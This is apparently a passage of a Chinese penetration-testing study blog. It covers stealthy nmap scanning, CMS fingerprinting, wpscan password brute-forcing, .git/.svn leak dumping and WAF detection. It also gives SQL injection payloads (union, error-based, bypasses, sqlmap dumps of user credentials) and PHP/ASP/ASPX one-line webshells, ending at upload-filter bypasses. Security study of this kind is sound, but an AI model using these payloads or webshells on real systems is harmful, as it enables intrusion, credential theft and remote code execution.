-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -p 0-65535 -oN FullTCP -iL liveHosts.txt</span><br><span class="line"></span><br><span class="line">-sS：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高（一个完整的tcp连接需要3次握手，而-sS选项不需要3次握手）</span><br><span class="line"></span><br><span class="line">优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高</span><br><span class="line">缺点：它需要root/administrator权限执行</span><br><span class="line"></span><br><span class="line">-Pn：扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描</span><br><span class="line"></span><br><span class="line">-iL：导入需要扫描的列表</span><br></pre></td></tr></table></figure>
-<h3 id="网站信息">网站信息</h3>
-<h4 id="操作系统">操作系统</h4>
-<ul>
-<li>ping判断：windows的TTL值一般为128，Linux则为64。<br>
-TTL大于100的一般为windows,几十的一般为linux。</li>
-<li>nmap -o [ip/域名]</li>
-<li>windows大小写不敏感，1inux则区分大小写</li>
-</ul>
-<h4 id="网站服务、容器类型">网站服务、容器类型</h4>
-<ul>
-<li>F12查看响应头Server字段</li>
-<li>whatweb</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whateweb -v -a 3 [ip]</span><br></pre></td></tr></table></figure>
-<ul>
-<li>wappalyzer插件</li>
-</ul>
-<p>apache,nginx,tomcat,IIS<br>
-通过容器类型、版本可考虑对应容器存在的漏洞（解析漏洞）</p>
-<h4 id="脚本类型">脚本类型</h4>
-<blockquote>
-<p>1.php<br>
-2.jsp<br>
-3.asp/aspx<br>
-4.python</p>
-</blockquote>
-<p>知道是什么语言才可以针对性的进行文件扫描、文件上传</p>
-<h4 id="数据库类型">数据库类型</h4>
-<blockquote>
-<p><a href="https://edu.yijinglab.com/post/298">https://edu.yijinglab.com/post/298</a></p>
-</blockquote>
-<h4 id="CMS识别">CMS识别</h4>
-<p>内容管理系统，用于网站内容文章管理。常见CMS:WordPress、Joomla、.Drupal、dedecms(织梦)、Discuz、phpcms等。</p>
-<ul>
-<li>CMS检测识别工具</li>
-</ul>
-<p>CMSeeK:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd CMSeek</span><br><span class="line">python TPscan.py</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-<p>joomscan识别Joomla：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joomscan -u http://192.168.233.187/</span><br></pre></td></tr></table></figure>
-<p>wpscan识别WordPress：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、刺探基础信息：</span><br><span class="line">wpscan --url http://www.example.com</span><br><span class="line"></span><br><span class="line">2、猜解后台用户名</span><br><span class="line">wpscan --url http://www.example.com --enumerate u</span><br><span class="line"></span><br><span class="line">3、使用字典暴破用户名admin的密码</span><br><span class="line">wpscan --url http://www.example.com -P password.txt -U admin </span><br><span class="line"></span><br><span class="line">4、扫描插件</span><br><span class="line">wpscan --url http://www.example.com --enumerate p</span><br><span class="line"></span><br><span class="line">5、扫描易受攻击的插件</span><br><span class="line">wpscan --url http://www.example.com --enumerate vp</span><br><span class="line"></span><br><span class="line">6、扫描所有插件</span><br><span class="line">wpscan --url http://www.example.com --enumerate ap</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>TPscan识别thinkphp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd TPscan</span><br><span class="line">python TPscan.py</span><br></pre></td></tr></table></figure>
-<h4 id="敏感文件">敏感文件</h4>
-<ul>
-<li>.git泄漏</li>
-</ul>
-<blockquote>
-<p>若存在.git泄漏，打开githack网站 <a href="https://githack.com/">https://githack.com/</a></p>
-<p>在网站上方的文本框中输入目标Git存储库的URL，例如<code>https://example.com/.git/</code></p>
-<p>点击<code>Generate link</code>按钮生成可下载存储库的链接。</p>
-<p>将生成的链接复制到浏览器地址栏中并打开。</p>
-<p>从打开的页面中下载压缩的Git存储库文件。</p>
-</blockquote>
-<ul>
-<li>.svn泄漏</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd SvnExploit</span><br><span class="line">python SvnExploit.py -u http://192.168.27.128/.svn</span><br><span class="line"># 下载</span><br><span class="line">python SvnExploit.py -u http://192.168.27.128/.svn --dump</span><br></pre></td></tr></table></figure>
-<ul>
-<li>目录扫描</li>
-</ul>
-<blockquote>
-<p>dirsearch -u [url]</p>
-<p>dir [url] /usr/share/wordlists/dirb/common.txt</p>
-<p>7kbscan(windows)</p>
-</blockquote>
-<h4 id="waf">waf</h4>
-<ul>
-<li>wafw00f</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wafw00f [url]</span><br></pre></td></tr></table></figure>
-<ul>
-<li>nmap</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap –p80,443 --script http-waf-detect ip</span><br><span class="line"></span><br><span class="line">nmap –p80,443 --script http-waf-fingerprint ip</span><br></pre></td></tr></table></figure>
-<h3 id="自动化集成工具">自动化集成工具</h3>
-<ul>
-<li>灯塔</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd LinuxEnvConfig</span><br><span class="line"></span><br><span class="line">sudo bash LinuxEnvConfig.sh</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">docker0的inet</span><br></pre></td></tr></table></figure>
-<ul>
-<li>EHole</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd D:\渗透\EHole\EHole_windows_amd64</span><br><span class="line">EHole_windows_amd64.exe -h</span><br><span class="line"></span><br><span class="line"># URL地址需带上协议,每行一个</span><br><span class="line">EHole_windows_amd64.exe finger -l url.txt</span><br><span class="line"># 支持单IP或IP段</span><br><span class="line">EHole_windows_amd64.exe finger -f 192.168.1.1/24</span><br><span class="line"># 结果输出至export.json文件</span><br><span class="line">EHole_windows_amd64.exe finger -l url.txt -json export.json</span><br></pre></td></tr></table></figure>
-<h1>漏洞挖掘</h1>
-<h2 id="SQL注入">SQL注入</h2>
-<h3 id="基础语法">基础语法</h3>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查找</span><br><span class="line">SELECT 列名 FROM 表名</span><br><span class="line">SELECT * FROM 表名</span><br><span class="line"># 删除</span><br><span class="line">DELETE FROM 表名称 WHERE 列名称 = 值</span><br><span class="line">DELETE * FROM 表名称</span><br><span class="line"># 更新</span><br><span class="line">UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值</span><br><span class="line"># 增加</span><br><span class="line">INSERT INTO 表名称 VALUES (值1, 值2,....)</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</span><br><span class="line"></span><br><span class="line"># 字符截取</span><br><span class="line"># 截取结果中的值，从第一个字符开始，截取1个字符</span><br><span class="line">select mid(database(),1,1)</span><br><span class="line"># 截取结果中的值，从第一个字符开始，截取1个字符</span><br><span class="line">select substr(database(),1,1)</span><br><span class="line"></span><br><span class="line"># 左右字符</span><br><span class="line"># 返回当前数据库最左边的1个字符串</span><br><span class="line">select left(database(),1);</span><br><span class="line"># 返回当前数据库最右边的1个字符串</span><br><span class="line">select right(database(),1);</span><br><span class="line"></span><br><span class="line"># 字符ASCII</span><br><span class="line"># 结果为1或者0，也就是true or false</span><br><span class="line">select ascii(substr(database(),1,1))&gt;97;</span><br><span class="line">select ord(substr(database(),1,1))&gt;97;</span><br><span class="line"></span><br><span class="line"># 行数</span><br><span class="line"># 返回查询结果行数</span><br><span class="line">select count(username) from users;</span><br><span class="line"></span><br><span class="line">#合并</span><br><span class="line">select group_concat(a) from (select database() as a union select version() as a) as t;</span><br><span class="line"></span><br><span class="line"># 基础信息</span><br><span class="line"># 在sql语言中，and优先级大于or</span><br><span class="line">--+     注释符</span><br><span class="line">limit 0,1      从你表中的第一个数据开始，只读取一个</span><br><span class="line">order by      排序，判断字段数量，也就是表的列数</span><br><span class="line">union select  联合查询，连接前面语句，起着合并查询的作用</span><br><span class="line">group_concat  合并多行数据到一行</span><br><span class="line">version()    当前数据库版本</span><br><span class="line">database()   当前数据库</span><br><span class="line">@@datadir    数据库数据路径</span><br><span class="line">@@version_compile_os    操作系统版本</span><br></pre></td></tr></table></figure>
-<h3 id="系统表">系统表</h3>
-<p>在MySQL中，把information_schema看作是一个数据库，确切说是信息数据库。保存数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
-<blockquote>
-<ul>
-<li>SCHEMATA 表：提供了当前mysql实例中所有数据库的信息。<br>
-show databases; 的结果取之此表。</li>
-</ul>
-<p>Schema.name列：所有数据库名</p>
-<ul>
-<li>TABLES 表：提供了关于数据库中的表的信息。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。<br>
-show tables from schemaname; (schemaname为指定数据库名)的结果取之此表。</li>
-</ul>
-<p>Table.name列：所有表名<br>
-Table.schema列：来自哪个数据库</p>
-<ul>
-<li>COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。<br>
-show columns from schemaname.tablename; (schemaname为指定数据库名, tablename为指定数据库下的数据表名)的结果取之此表。</li>
-</ul>
-<p>Column_name列：所有列名<br>
-Table.name列：来自哪个表<br>
-Table.schema列：来自哪个数据库</p>
-</blockquote>
-<h3 id="判断是否有漏洞">判断是否有漏洞</h3>
-<p>根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，说明存在注入漏洞。</p>
-<h3 id="类型">类型</h3>
-<blockquote>
-<p>按参数类型分类：<br>
-数字型<br>
-字符型<br>
-搜索型<br>
-按数据库返回结果分类：<br>
-回显注入<br>
-报错注入<br>
-盲注<br>
-基于布尔的盲注<br>
-基于时间的盲注<br>
-按注入点位置分类：<br>
-GET注入<br>
-POST注入<br>
-Cookie注入<br>
-Header注入<br>
-… …</p>
-</blockquote>
-<h4 id="数字型">数字型</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.and逻辑测试：</span><br><span class="line"></span><br><span class="line">and 1=1  sql语句： select name from users where id=1 and 1=1</span><br><span class="line">and 1=2  sql语句： select name from users where id=1 and 1=2</span><br><span class="line"></span><br><span class="line">通过比较页面的变化判断输入是否被带入数据库执行。</span><br><span class="line"></span><br><span class="line">2.单引号测试：</span><br><span class="line"></span><br><span class="line">sql语句： select name from users where id=1&#x27;</span><br><span class="line"></span><br><span class="line">构造sql语法错误，来判断输入是否被执行。</span><br></pre></td></tr></table></figure>
-<h4 id="字符型">字符型</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;、id=1&quot;  构造sql语法错误，来判断输入是否被执行。</span><br><span class="line"></span><br><span class="line">1 and 1=1</span><br><span class="line">SQL语句： select name from users where id=&#x27;1 and 1=1&#x27;</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">SQL语句： select name from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">1&#x27; and 1=1 #</span><br><span class="line">SQL语句： select name from users where id=&#x27;1&#x27; and 1=1 #&#x27;</span><br><span class="line">1&#x27; and 1=2 #</span><br><span class="line">SQL语句： select name from users where id=&#x27;1&#x27; and 1=2 #&#x27;</span><br></pre></td></tr></table></figure>
-<h4 id="搜索型">搜索型</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL=&quot;select * from users where name like &#x27;%tom%&#x27;&quot;</span><br><span class="line"></span><br><span class="line">1 and 1=1</span><br><span class="line">SQL查询语句为：select * from users where id like &#x27;%1 and 1=1%&#x27;</span><br><span class="line">这个输入显然会报错误。</span><br><span class="line"></span><br><span class="line">1%&#x27;1 and &#x27;%1%&#x27;&#x27; = &#x27;%1</span><br><span class="line">SQL查询语句：select * from users where name like &#x27;%1%&#x27; and &#x27;%1%&#x27; = &#x27;%1%&#x27;</span><br><span class="line">这里我们用 &#x27;% 来闭合 %&#x27; ，如果存在漏洞，返回正常信息。</span><br></pre></td></tr></table></figure>
-<h4 id="GET显错注入">GET显错注入</h4>
-<p>流程</p>
-<blockquote>
-<p>01、获取字段数    order by x<br>
-02、获取显示位    union select 1,2,3,4……<br>
-03、获取数据库信息        version()，user()，@@datadir<br>
-04、获取当前数据库        database()， schema()<br>
-05、获取所有数据库<br>
-06、获取数据库表<br>
-07、获取所有字段<br>
-08、获取数据</p>
-<ul>
-<li>确定数字、字符、搜索型</li>
-<li>注入点</li>
-<li>当前数据库长度</li>
-<li>遍历得当前数据库名称</li>
-<li>获取数据库表总数</li>
-<li>依次获取表的长度、名字</li>
-<li>获取列</li>
-<li>获取数据</li>
-</ul>
-</blockquote>
-<p>注入步骤</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 判断：</span><br><span class="line">id=1&#x27; and 1=1 --+</span><br><span class="line">id=-1&#x27; or 1=1 --+</span><br><span class="line"></span><br><span class="line"># order by语句判断字段数量：</span><br><span class="line">id=1&#x27; order by 3 --+</span><br><span class="line"></span><br><span class="line"># 联合查询获取显示位：</span><br><span class="line">id=-1&#x27; union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line"># 获取当前数据库：</span><br><span class="line">id=-1&#x27; union select 1,(select database()),3 --+</span><br><span class="line"></span><br><span class="line"># 获取所有数据库：</span><br><span class="line">id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br><span class="line"></span><br><span class="line"># 获取当前数据库表名：</span><br><span class="line">id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line"></span><br><span class="line"># 获取users表所有字段：</span><br><span class="line">id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line"></span><br><span class="line"># 获取security.users表所有字段</span><br><span class="line">id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;--+</span><br><span class="line"></span><br><span class="line"># 获取security.users表所有字段内容：</span><br><span class="line">id=-1&#x27; union select 1,username,password from users --+</span><br></pre></td></tr></table></figure>
-<h4 id="报错注入">报错注入</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
-<h3 id="绕过">绕过</h3>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注释符可替换空格 /**/ # --</span><br><span class="line"></span><br><span class="line">内联注入</span><br><span class="line">/*!/*!*/</span><br><span class="line">/* */ 在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="工具使用">工具使用</h3>
-<ul>
-<li>sqlmap</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入sqlmap目录</span><br><span class="line"></span><br><span class="line"># 检测漏洞</span><br><span class="line">python sqlmap.py [url]</span><br><span class="line">python sqlmap.py -u http://mingy.lab/Less-1/?id=1</span><br><span class="line"></span><br><span class="line"># 获取当前用户</span><br><span class="line">python sqlmap.py -u [url] --current-user</span><br><span class="line"># 当前数据库</span><br><span class="line">python sqlmap.py -u [url] --current-db</span><br><span class="line"># 所有数据库名</span><br><span class="line">python sqlmap.py -u [url] --dbs</span><br><span class="line"># 数据库表名</span><br><span class="line">python sqlmap.py -u [url] -D [库名] --tables</span><br><span class="line"># 列名</span><br><span class="line">python sqlmap.py -u [url] -D [库名] -T [表名] --columns</span><br><span class="line"># 字段值</span><br><span class="line">python sqlmap.py -u [url] -D [库名] -T [表名] -C [列名1],[列名2] --dump</span><br><span class="line"></span><br><span class="line"># post注入</span><br><span class="line">python sqlmap.py -r aa.txt</span><br><span class="line">python sqlmap.py -r aa.txt --current-db --tables</span><br><span class="line"></span><br><span class="line"># aa.txt内容示例如下：</span><br><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: session=123456</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=123456</span><br><span class="line">#请求方法（如 POST）|目标路径（如 /login.php）|Host 头和其他必要头部（如 Content-Type）|空一行后接 POST 数据（如 username=...&amp;password=...）</span><br></pre></td></tr></table></figure>
-<h2 id="文件上传">文件上传</h2>
-<h3 id="常见一句话木马">常见一句话木马</h3>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php一句话木马： </span><br><span class="line">&lt;?php @eval($_POST[value]);?&gt;</span><br><span class="line">asp一句话木马： </span><br><span class="line">&lt;%eval request(&quot;value&quot;)%&gt;</span><br><span class="line">aspx一句话木马： </span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="绕过-2">绕过</h3>
-<ul>
-<li>绕过客户端检测/JS检测</li>
-</ul>
-<p>原理：通常在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测文件类型和扩展名是否合法。</p>
-<p>方法：在本地浏览器客户端禁用]S即可；可使用火狐浏览器的Noscript插件、IE中禁用JS等方式实现，利用burpsuite可以绕过一切客户端检测。</p>
-<ul>
-<li>绕过服务端检测</li>
-</ul>
-]]></content>
   </entry>
 </search>
